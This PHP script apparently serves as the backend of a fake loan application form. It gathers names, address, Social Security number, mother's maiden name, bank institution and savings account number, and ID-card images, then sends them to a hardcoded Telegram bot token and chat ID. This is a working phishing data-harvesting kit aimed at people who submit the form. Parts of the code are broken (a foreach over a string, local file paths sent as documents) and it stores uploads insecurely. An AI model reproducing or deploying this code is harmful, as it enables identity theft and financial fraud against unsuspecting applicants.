<?php
// Retain the timestamp field
$timestamp = date("Y-m-d H:i:s");

// Get form inputs
$name_prefix = htmlspecialchars($_POST['q61_name']['prefix'] ?? '');
$first_name = htmlspecialchars($_POST['q61_name']['first'] ?? '');
$last_name = htmlspecialchars($_POST['q61_name']['last'] ?? '');
$full_name = trim("$name_prefix $first_name $last_name");

$email = htmlspecialchars($_POST['q78_email78'] ?? '');
$phone = htmlspecialchars($_POST['q72_phone']['full'] ?? '');

$address = htmlspecialchars($_POST['q76_address76']['addr_line1'] ?? '') . " " . 
            htmlspecialchars($_POST['q76_address76']['addr_line2'] ?? '') . ", " .
            htmlspecialchars($_POST['q76_address76']['city'] ?? '') . ", " .
            htmlspecialchars($_POST['q76_address76']['state'] ?? '') . ", " .
            htmlspecialchars($_POST['q76_address76']['postal'] ?? '');

$marital_status = htmlspecialchars($_POST['q6_maritalStatus'] ?? '');
$social_security = htmlspecialchars($_POST['q92_socialSecurity'] ?? '');

$fathers_full_name = trim(htmlspecialchars($_POST['q105_fathersFull']['first'] ?? '') . " " . 
                        htmlspecialchars($_POST['q105_fathersFull']['last'] ?? ''));

$mothers_full_name = trim(htmlspecialchars($_POST['q106_mothersFull']['first'] ?? '') . " " . 
                        htmlspecialchars($_POST['q106_mothersFull']['last'] ?? ''));

$place_of_birth = htmlspecialchars($_POST['q107_placeofbirth'] ?? '');
$mothers_maiden_name = htmlspecialchars($_POST['q108_mothersmaiden'] ?? '');

$present_employer = trim(htmlspecialchars($_POST['q82_presentEmployer82']['first'] ?? '') . " " . 
                      htmlspecialchars($_POST['q82_presentEmployer82']['last'] ?? ''));

$occupation = htmlspecialchars($_POST['q30_occupation'] ?? '');
$years_of_experience = htmlspecialchars($_POST['q79_yearsOf'] ?? '');
$gross_monthly_income = htmlspecialchars($_POST['q80_grossMonthly80'] ?? '');
$monthly_rent_mortgage = htmlspecialchars($_POST['q81_monthlyRentmortgage'] ?? '');

$institution_name = htmlspecialchars($_POST['q110_institutionName'] ?? '');
$savings_account = htmlspecialchars($_POST['q109_savingsAccount'] ?? '');
$bank_phone_number = htmlspecialchars($_POST['q111_phoneNumberBank']['full'] ?? '');

$i_authorize = htmlspecialchars($_POST['q51_iAuthorize51'] ?? '');
$i_hereby_agree = htmlspecialchars($_POST['q52_iHereby'] ?? '');

// Telegram Bots
$telegram_bots = "7810816894:AAE7eOvKsbTjvCr3zdpgsIf-vXqddsYY0Rk"; // Replace with actual bot tokens
$telegram_chat_id = "7678714988"; // Replace with actual chat ID

// Create the uploads directory if it doesn't exist
if (!file_exists('uploads')) {
    mkdir('uploads', 0777, true);
}

// Function to process uploaded files
function process_upload($file) {
    if ($file['error'] === UPLOAD_ERR_OK) {
        $target_path = 'uploads/' . basename($file['name']);
        move_uploaded_file($file['tmp_name'], $target_path);
        return $target_path;
    }
    return null;
}

// Handle file uploads
$front_id_path = process_upload($_FILES['front_id'] ?? []);
$back_id_path = process_upload($_FILES['back_id'] ?? []);

// Function to send messages to multiple Telegram bots
function send_telegram_message($message) {
    global $telegram_bots, $telegram_chat_id;
    foreach ($telegram_bots as $bot_token) {
        file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$telegram_chat_id&text=" . urlencode($message) . "&parse_mode=Markdown");
    }
}

// Send text message to Telegram
send_telegram_message("📝 *New Loan Application*\n\n".
                      "👤 *Name:* $full_name\n".
                      "🏠 *Address:* $address\n".
                      "📧 *Email:* $email\n".
                      "📞 *Phone:* $phone\n".
                      "💼 *Occupation:* $occupation\n".
                      "📆 *Years of Experience:* $years_of_experience\n".
                      "💰 *Gross Monthly Income:* $gross_monthly_income\n".
                      "🏠 *Monthly Rent/Mortgage:* $monthly_rent_mortgage\n".
                      "🏦 *Institution Name:* $institution_name\n".
                      "💳 *Savings Account:* $savings_account\n".
                      "📞 *Bank Phone Number:* $bank_phone_number\n".
                      "🔐 *SSN:* $social_security\n".
                      "⏳ *Submitted At:* $timestamp\n".
                      "📎 *Identity Verification:* " . ($i_authorize && $i_hereby_agree ? "✅ Authorized" : "❌ Not Provided"));

// Function to send files to multiple Telegram bots
function send_telegram_file($file_path) {
    global $telegram_bots, $telegram_chat_id;
    if ($file_path) {
        foreach ($telegram_bots as $bot_token) {
            file_get_contents("https://api.telegram.org/bot$bot_token/sendDocument?chat_id=$telegram_chat_id&document=" . urlencode($file_path));
        }
    }
}

// Send files to Telegram
send_telegram_file($front_id_path);
send_telegram_file($back_id_path);

// Example action (e.g., store in database, send email, etc.)
echo "Form submitted successfully.";
?>
